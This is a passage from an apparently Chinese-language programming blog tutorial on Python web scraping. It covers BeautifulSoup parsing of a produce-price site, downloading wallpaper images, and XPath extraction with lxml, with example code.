class="line"><span class="comment"># title = page.find(&quot;span&quot;, class_=&quot;title&quot;)  # class是python的关键字，所以要换个写法</span></span><br><span class="line">title = page.find(<span class="string">&quot;span&quot;</span>, attrs=&#123;<span class="string">&quot;class&quot;</span>: <span class="string">&quot;title&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(title)</span><br><span class="line"></span><br><span class="line">resp.close()</span><br></pre></td></tr></table></figure><h4 id="bs4解析入门-新发地爬虫"><a href="#bs4解析入门-新发地爬虫" class="headerlink" title="bs4解析入门-新发地爬虫"></a>bs4解析入门-新发地爬虫</h4><p>​    这是最开始的程序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line">resp = requests.get(<span class="string">&quot;http://www.xinfadi.com.cn/marketanalysis/0/list/1.shtml&quot;</span>)</span><br><span class="line">page = BeautifulSoup(resp.text,<span class="string">&quot;html.paser&quot;</span>)</span><br><span class="line">table = page.find(<span class="string">&quot;table&quot;</span>, class_=<span class="string">&quot;hq_table&quot;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;新发地.csv&quot;</span>, mode=<span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">cv_writer = csv.writer(f)</span><br><span class="line"><span class="comment"># 提取到所有tr</span></span><br><span class="line">tr_list = table.find_all(<span class="string">&quot;tr&quot;</span>)[<span class="number">1</span>:] <span class="comment"># 注意,第⼀⾏并不是我想要的数据. (第⼀⾏是表头)</span></span><br><span class="line"><span class="keyword">for</span> tr <span class="keyword">in</span> tr_list:</span><br><span class="line">td_list = tr.find_all(<span class="string">&quot;td&quot;</span>)</span><br><span class="line">name = td_list[<span class="number">0</span>].text <span class="comment"># 获取⽂本内容</span></span><br><span class="line">low = td_list[<span class="number">1</span>].text</span><br><span class="line">avg = td_list[<span class="number">2</span>].text</span><br><span class="line">high = td_list[<span class="number">3</span>].text</span><br><span class="line">gui = td_list[<span class="number">4</span>].text</span><br><span class="line">dan = td_list[<span class="number">5</span>].text</span><br><span class="line">day = td_list[<span class="number">6</span>].text</span><br><span class="line">cv_writer.writerow([name, low, avg, high,gui, dan, day])</span><br><span class="line">f.close()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;搞定&quot;</span>)</span><br></pre></td></tr></table></figure><p>​    去看的时候已经改掉了，改成了前端js渲染，这里也写一个小爬虫，可自行参考</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://www.xinfadi.com.cn/getPriceData.html&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) &quot;</span></span><br><span class="line">                  <span class="string">&quot;Chrome/104.0.0.0 Safari/537.36 &quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;limit=&amp;current=&amp;pubDateStartTime=&amp;pubDateEndTime=&amp;prodPcatid=&amp;prodCatid=&amp;prodName=&quot;</span></span><br><span class="line"></span><br><span class="line">resp = requests.post(url, headers=headers, data=data)</span><br><span class="line">respdata = resp.json()</span><br><span class="line">pricedata = respdata[<span class="string">&#x27;list&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> pd <span class="keyword">in</span> pricedata:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;名字: &quot;</span>+pd[<span class="string">&#x27;prodName&#x27;</span>] + <span class="string">&quot; 最低价格: &quot;</span>+pd[<span class="string">&#x27;lowPrice&#x27;</span>]+<span class="string">&quot; 最高价格: &quot;</span>+pd[<span class="string">&#x27;highPrice&#x27;</span>])</span><br><span class="line">    </span><br><span class="line">resp.close()</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074036.jpg"                      alt="image-20220909182618978"                ></p><h4 id="抓取唯美壁纸图片"><a href="#抓取唯美壁纸图片" class="headerlink" title="抓取唯美壁纸图片"></a>抓取唯美壁纸图片</h4><p>​    url:<a class="link"   href="https://www.umei.cc/bizhitupian/weimeibizhi/" >https://www.umei.cc/bizhitupian/weimeibizhi/<i class="fas fa-external-link-alt"></i></a></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074040.jpg"                      alt="image-20220909213318770"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-74042.jpg"                      alt="image-20220909214725010"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074044.jpg"                      alt="image-20220909224457523"                ></p><p>​    1.拿到主页面的源代码，拿到链接地址 ,href</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://www.umei.cc/bizhitupian/weimeibizhi/&quot;</span></span><br><span class="line">resp = requests.get(url)</span><br><span class="line">resp.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure><p>​    2.源代码交给bs</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">main_page = BeautifulSoup(resp.text, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">alist = main_page.find(<span class="string">&quot;div&quot;</span>, class_=<span class="string">&quot;pic-box&quot;</span>).find_all(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(alist)</span><br></pre></td></tr></table></figure><p>​    3.拼接url拿到子链接地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.拿到主页面的源代码，拿到链接地址 ,href</span></span><br><span class="line"><span class="comment"># 2、通过href拿到子页面的内容，从子页面中找到图片的下载地址  img -&gt; src</span></span><br><span class="line"><span class="comment"># 3、下载图片</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">child_href_list = []</span><br><span class="line"></span><br><span class="line">urlhome = <span class="string">&quot;https://www.umei.cc&quot;</span></span><br><span class="line">url = <span class="string">&quot;https://www.umei.cc/bizhitupian/weimeibizhi/&quot;</span></span><br><span class="line">resp = requests.get(url)</span><br><span class="line">resp.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 源代码交给bs</span></span><br><span class="line">main_page = BeautifulSoup(resp.text, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">alist = main_page.find(<span class="string">&quot;div&quot;</span>, class_=<span class="string">&quot;pic-box&quot;</span>).find_all(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="comment"># print(alist)</span></span><br><span class="line"><span class="comment"># for a in alist:</span></span><br><span class="line"><span class="comment">#     print(a.get(&#x27;href&#x27;))  # 拿到的是href里的值</span></span><br><span class="line"><span class="keyword">for</span> hrefList <span class="keyword">in</span> alist:</span><br><span class="line">    child_href = urlhome + hrefList.get(<span class="string">&#x27;href&#x27;</span>)</span><br><span class="line">    child_href_list.append(child_href)</span><br><span class="line"><span class="built_in">print</span>(child_href_list)</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074048.jpg"                      alt="image-20220909224544336"                ></p><p>​    看看子页面</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074050.jpg"                      alt="image-20220909225940673"                ></p><p>​    提取子页面内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.拿到主页面的源代码，拿到链接地址 ,href</span></span><br><span class="line"><span class="comment"># 2、通过href拿到子页面的内容，从子页面中找到图片的下载地址  img -&gt; src</span></span><br><span class="line"><span class="comment"># 3、下载图片</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">child_href_list = []</span><br><span class="line"></span><br><span class="line">urlhome = <span class="string">&quot;https://www.umei.cc&quot;</span></span><br><span class="line">url = <span class="string">&quot;https://www.umei.cc/bizhitupian/weimeibizhi/&quot;</span></span><br><span class="line">resp = requests.get(url)</span><br><span class="line">resp.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 源代码交给bs</span></span><br><span class="line">main_page = BeautifulSoup(resp.text, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">alist = main_page.find(<span class="string">&quot;div&quot;</span>, class_=<span class="string">&quot;pic-box&quot;</span>).find_all(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="comment"># print(alist)</span></span><br><span class="line"><span class="comment"># for a in alist:</span></span><br><span class="line"><span class="comment">#     print(a.get(&#x27;href&#x27;))  # 拿到的是href里的值</span></span><br><span class="line"><span class="keyword">for</span> hrefList <span class="keyword">in</span> alist:</span><br><span class="line">    href = hrefList.get(<span class="string">&#x27;href&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> href:</span><br><span class="line">        child_href = urlhome + href</span><br><span class="line">        child_href_list.append(child_href)</span><br><span class="line"><span class="comment"># print(child_href_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取子页面内容</span></span><br><span class="line"><span class="keyword">for</span> href <span class="keyword">in</span> child_href_list:</span><br><span class="line">    child_resp = requests.get(href)</span><br><span class="line">    child_resp.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    child_page_text = child_resp.text</span><br><span class="line">    <span class="comment"># print(child_page_text)</span></span><br><span class="line">    child_page = BeautifulSoup(child_page_text, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    img = child_page.find(<span class="string">&quot;section&quot;</span>, class_=<span class="string">&quot;img-content&quot;</span>).find(<span class="string">&quot;img&quot;</span>)</span><br><span class="line">    src = img.get(<span class="string">&quot;src&quot;</span>)</span><br><span class="line">    <span class="comment"># print(src)</span></span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-74051.jpg"                      alt="image-20220911141107707"                ></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.拿到主页面的源代码，拿到链接地址 ,href</span></span><br><span class="line"><span class="comment"># 2、通过href拿到子页面的内容，从子页面中找到图片的下载地址  img -&gt; src</span></span><br><span class="line"><span class="comment"># 3、下载图片</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">child_href_list = []</span><br><span class="line"></span><br><span class="line">urlhome = <span class="string">&quot;https://www.umei.cc&quot;</span></span><br><span class="line">url = <span class="string">&quot;https://www.umei.cc/bizhitupian/weimeibizhi/&quot;</span></span><br><span class="line">resp = requests.get(url)</span><br><span class="line">resp.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 源代码交给bs</span></span><br><span class="line">main_page = BeautifulSoup(resp.text, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">alist = main_page.find(<span class="string">&quot;div&quot;</span>, class_=<span class="string">&quot;pic-box&quot;</span>).find_all(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="comment"># print(alist)</span></span><br><span class="line"><span class="comment"># for a in alist:</span></span><br><span class="line"><span class="comment">#     print(a.get(&#x27;href&#x27;))  # 拿到的是href里的值</span></span><br><span class="line"><span class="keyword">for</span> hrefList <span class="keyword">in</span> alist:</span><br><span class="line">    href = hrefList.get(<span class="string">&#x27;href&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> href:</span><br><span class="line">        child_href = urlhome + href</span><br><span class="line">        child_href_list.append(child_href)</span><br><span class="line"><span class="comment"># print(child_href_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取子页面内容</span></span><br><span class="line"><span class="keyword">for</span> href <span class="keyword">in</span> child_href_list:</span><br><span class="line">    child_resp = requests.get(href)</span><br><span class="line">    child_resp.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    child_page_text = child_resp.text</span><br><span class="line">    <span class="comment"># print(child_page_text)</span></span><br><span class="line">    child_page = BeautifulSoup(child_page_text, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    img = child_page.find(<span class="string">&quot;section&quot;</span>, class_=<span class="string">&quot;img-content&quot;</span>).find(<span class="string">&quot;img&quot;</span>)</span><br><span class="line">    src = img.get(<span class="string">&quot;src&quot;</span>)</span><br><span class="line">    <span class="comment"># print(src)</span></span><br><span class="line">    <span class="comment"># 下载图片</span></span><br><span class="line">    img_resp = requests.get(src)</span><br><span class="line">    <span class="comment"># img_rest.content  # 这里是字节</span></span><br><span class="line">    img_name = src.split(<span class="string">&quot;/&quot;</span>)[-<span class="number">1</span>]  <span class="comment"># 拿到url中的最后一个/以后的内容</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;img/&quot;</span> + img_name, mode=<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(img_resp.content)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;over!!&quot;</span>, img_name)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">resp.close()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;allover!!&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​    如果很卡，可能在pycharm里选择，这样pycharm就不会作索引，会变快一点</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074053.jpg"                      alt="image-20220911142002956"                ></p><h4 id="Xpath入门"><a href="#Xpath入门" class="headerlink" title="Xpath入门"></a>Xpath入门</h4><p>​    XPath是⼀⻔在 XML ⽂档中查找信息的语⾔. XPath可⽤来在 XML ⽂档中对元素和属性进⾏遍历. ⽽我们熟知的HTML恰巧属于XML的 ⼀个⼦集. 所以完全可以⽤xpath去查找html中的内容</p><p>​    ⾸先, 先了解⼏个概念.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">book</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">id</span>&gt;</span>1<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">name</span>&gt;</span>野花遍地⾹<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">price</span>&gt;</span>1.23<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">author</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">nick</span>&gt;</span>周⼤强<span class="tag">&lt;/<span class="name">nick</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">nick</span>&gt;</span>周芷若<span class="tag">&lt;/<span class="name">nick</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​    在上述html中</p><pre><code>1. book, id, name, price....都被称为节点. 1.  Id, name, price, author被称为book的⼦节点 1.  book被称为id, name, price, author的⽗节点  1.  id, name, price,author被称为同胞节点 </code></pre><p>​     有了这些基础知识后, 我们就可以开始了解xpath的基本语法了 在python中想要使⽤xpath, 需要安装lxml模块.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install lxml</span><br></pre></td></tr></table></figure><p>​    ⽤法: </p><pre><code>1. 将要解析的html内容构造出etree对象. 1.  使⽤etree对象的xpath()⽅法配合xpath表达式来完成对数据的提取</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">xml = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;book&gt;</span></span><br><span class="line"><span class="string">    &lt;id&gt;1&lt;/id&gt;</span></span><br><span class="line"><span class="string">    &lt;name&gt;野花遍地⾹&lt;/name&gt;</span></span><br><span class="line"><span class="string">    &lt;price&gt;1.23&lt;/price&gt;</span></span><br><span class="line"><span class="string">    &lt;nick&gt;臭⾖腐&lt;/nick&gt;</span></span><br><span class="line"><span class="string">    &lt;author&gt;</span></span><br><span class="line"><span class="string">        &lt;nick id=&quot;10086&quot;&gt;周⼤强&lt;/nick&gt;</span></span><br><span class="line"><span class="string">        &lt;nick id=&quot;10010&quot;&gt;周芷若&lt;/nick&gt;</span></span><br><span class="line"><span class="string">        &lt;nick class=&quot;joy&quot;&gt;周杰伦&lt;/nick&gt;</span></span><br><span class="line"><span class="string">        &lt;nick class=&quot;jolin&quot;&gt;蔡依林&lt;/nick&gt;</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;nick&gt;惹了&lt;/nick&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/author&gt;</span></span><br><span class="line"><span class="string">    &lt;partner&gt;</span></span><br><span class="line"><span class="string">        &lt;nick id=&quot;ppc&quot;&gt;胖胖陈&lt;/nick&gt;</span></span><br><span class="line"><span class="string">        &lt;nick id=&quot;ppbc&quot;&gt;胖胖不陈&lt;/nick&gt;</span></span><br><span class="line"><span class="string">   &lt;/partner&gt;</span></span><br><span class="line"><span class="string">&lt;/book&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">tree = etree.XML(xml)</span><br><span class="line"><span class="comment"># result = tree.xpath(&quot;/book&quot;)  # /表示层级关系，第一个/是根节点</span></span><br><span class="line"><span class="comment"># result = tree.xpath(&quot;/book/name&quot;)</span></span><br><span class="line"><span class="comment"># result = tree.xpath(&quot;/book/name/text()&quot;)  # text() 拿文本</span></span><br><span class="line">result = tree.xpath(<span class="string">&quot;/book/author/nick/text()&quot;</span>) <span class="comment"># [&#x27;周⼤强&#x27;, &#x27;周芷若&#x27;, &#x27;周杰伦&#x27;, &#x27;蔡依林&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">xml = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;book&gt;</span></span><br><span class="line"><span class="string">    &lt;id&gt;1&lt;/id&gt;</span></span><br><span class="line"><span class="string">    &lt;name&gt;野花遍地⾹&lt;/name&gt;</span></span><br><span class="line"><span class="string">    &lt;price&gt;1.23&lt;/price&gt;</span></span><br><span class="line"><span class="string">    &lt;nick&gt;臭⾖腐&lt;/nick&gt;</span></span><br><span class="line"><span class="string">    &lt;author&gt;</span></span><br><span class="line"><span class="string">        &lt;nick id=&quot;10086&quot;&gt;周⼤强&lt;/nick&gt;</span></span><br><span class="line"><span class="string">        &lt;nick id=&quot;10010&quot;&gt;周芷若&lt;/nick&gt;</span></span><br><span class="line"><span class="string">        &lt;nick class=&quot;joy&quot;&gt;周杰伦&lt;/nick&gt;</span></span><br><span class="line"><span class="string">        &lt;nick class=&quot;jolin&quot;&gt;蔡依林&lt;/nick&gt;</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;nick&gt;热热热热&lt;/nick&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;nick&gt;热热热热2&lt;/nick&gt;</span></span><br><span class="line"><span class="string">            &lt;div&gt;</span></span><br><span class="line"><span class="string">                &lt;nick&gt;热热热热3&lt;/nick&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/author&gt;</span></span><br><span class="line"><span class="string">    &lt;partner&gt;</span></span><br><span class="line"><span class="string">        &lt;nick id=&quot;ppc&quot;&gt;胖胖陈&lt;/nick&gt;</span></span><br><span class="line"><span class="string">        &lt;nick id=&quot;ppbc&quot;&gt;胖胖不陈&lt;/nick&gt;</span></span><br><span class="line"><span class="string">   &lt;/partner&gt;</span></span><br><span class="line"><span class="string">&lt;/book&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">tree = etree.XML(xml)</span><br><span class="line"><span class="comment"># result = tree.xpath(&quot;/book&quot;)  # /表示层级关系，第一个/是根节点</span></span><br><span class="line"><span class="comment"># result = tree.xpath(&quot;/book/name&quot;)</span></span><br><span class="line"><span class="comment"># result = tree.xpath(&quot;/book/name/text()&quot;)  # text() 拿文本</span></span><br><span class="line"><span class="comment"># result = tree.xpath(&quot;/book/author/nick/text()&quot;)  # [&#x27;周⼤强&#x27;, &#x27;周芷若&#x27;, &#x27;周杰伦&#x27;, &#x27;蔡依林&#x27;]</span></span><br><span class="line"><span class="comment"># result = tree.xpath(&quot;/book/author//nick/text()&quot;)  # 找到所有后代节点里的nick节点</span></span><br><span class="line">result = tree.xpath(<span class="string">&quot;/book/author/*/nick/text()&quot;</span>)  <span class="comment"># *任意的节点. 通配符</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>​    找到所有后代节点里的nick节点：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074054.jpg"                      alt="image-20220911223833325"                ></p><p>​    *任意的节点. 通配符</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074056.jpg"                      alt="image-20220911224313256"                ></p><p>​    xpath如何提取属性信息. 上⼀段真实的HTML来给各位讲解⼀ 下 准备HTML：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span 